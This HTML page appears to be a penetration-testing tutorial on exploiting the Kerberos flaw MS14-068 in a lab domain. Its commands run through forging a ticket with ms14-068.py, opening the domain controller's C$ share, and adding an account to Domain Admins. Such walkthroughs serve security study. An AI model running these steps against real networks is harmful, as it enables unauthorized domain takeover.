<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Example With MS14-068.py</title>
</head><body><b>Install and Configure Kerberos</b><br/>
<br/>
Install kerberos:<br/>
apt-get install krb5-user krb5-config<br/>
<br/>
Create relevant kerberos config changes in /etc/krb5.conf:<br/>
[libdefaults]<br/>
&nbsp; default_realm = pwn3d.local<br/>
[realms]<br/>
&nbsp; pwn3d.local = {<br/>
&nbsp; &nbsp; kdc = dc1.pwn3d.local<br/>
&nbsp; &nbsp; admin_server = dc1.pwn3d.local<br/>
&nbsp; &nbsp; default_domain = pwn3d.local<br/>
}<br/>
Point DNS to the DNS Server/domain controller so SRV records (e.g. _kerberos._tcp.*) will resolve correctly in /etc/resolv.conf.<br/>
<br/>
According to the TrustedSec <a href="https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/">blog</a>, you’ll need to sync time with the domain controller. During my testing I didn’t perform any syncing and had no issues.<br/>
<br/>
<br/>
<b>Download, Compile and Install Samba</b><br/>
The Kali Samba package is missing many of the Samba tools, including several that are very useful for exploiting MS14-068. The build steps below are based on mubix’s blog post <a href="http://www.room362.com/blog/2014/05/14/dumping-ntds-dot-dit-domain-hashes-using-samba/">Dumping NTDS.dit Domain Hashes Using Samba</a>.<br/>
<br/>
Download Samba 4.1.0 and the replication only patch.<br/>
wget http://ftp.samba.org/pub/samba/stable/samba-4.1.0.tar.gz<br/>
wget http://files.securusglobal.com/samba-4.1.0_replication-only-patch.txt<br/>
<br/>
Extract the tarball.<br/>
tar zxvf samba-4.1.0.tar.gz mkdir src mv samba-4.1.0 src/<br/>
<br/>
Add the replication only patch.<br/>
patch -p0 &lt; samba-4.1.0_replication-only-patch.txt<br/>
<br/>
Build and install Samba.<br/>
cd src/samba-4.1.0/<br/>
./configure<br/>
make -j 2 &amp;&amp; make install<br/>
<br/>
<br/>
<b>Exploitation</b><br/>
Determine the user SID:<br/>
<br/>
rpcclient $&gt; lookupnames john.smith<br/>
john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)<br/>
Supply the SID and relevant config options to the python script and the magic happens.<br/>
<br/>
# python ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10<br/>
Password:<br/>
&nbsp; [+] Building AS-REQ for 192.168.115.10... Done!<br/>
&nbsp; [+] Sending AS-REQ to 192.168.115.10... Done!<br/>
&nbsp; [+] Receiving AS-REP from 192.168.115.10... Done!<br/>
&nbsp; [+] Parsing AS-REP from 192.168.115.10... Done!<br/>
&nbsp; [+] Building TGS-REQ for 192.168.115.10... Done!<br/>
&nbsp; [+] Sending TGS-REQ to 192.168.115.10... Done!<br/>
&nbsp; [+] Receiving TGS-REP from 192.168.115.10... Done!<br/>
&nbsp; [+] Parsing TGS-REP from 192.168.115.10... Done!<br/>
&nbsp; [+] Creating ccache file 'TGT_john.smith@pwn3d.local.ccache'... Done!<br/>
<br/>
Make the TGT your kerberos TGT.<br/>
# mv TGT_john.smith@pwn3d.local.ccache /tmp/krb5cc_$(echo $UID)<br/>
<br/>
<b><br/>
</b><b>PWN!</b><br/>
If all went well, you can now use kerberos to authenticate.<br/>
<br/>
# smbclient -k -W pwn3d -U john.smith //dc1.pwn3d.local/C$<br/>
OS=[Windows Server 2008 R2 Standard 7601 Service Pack 1] Server=[Windows Server 2008 R2 Standard 6.1]<br/>
smb: \&gt;<br/>
<br/>
Create a new account and make it a member of the Domain Admins groups using the samba4 utilities/example code.<br/>
./user_add dc1.pwn3d.local kerberpwn3d2 Password1 -W pwn3d -U john.smith -k<br/>
./group_adduser dc1.pwn3d.local "Domain Admins" kerberpwn3d -W pwn3d -U john.smith -k</body></html>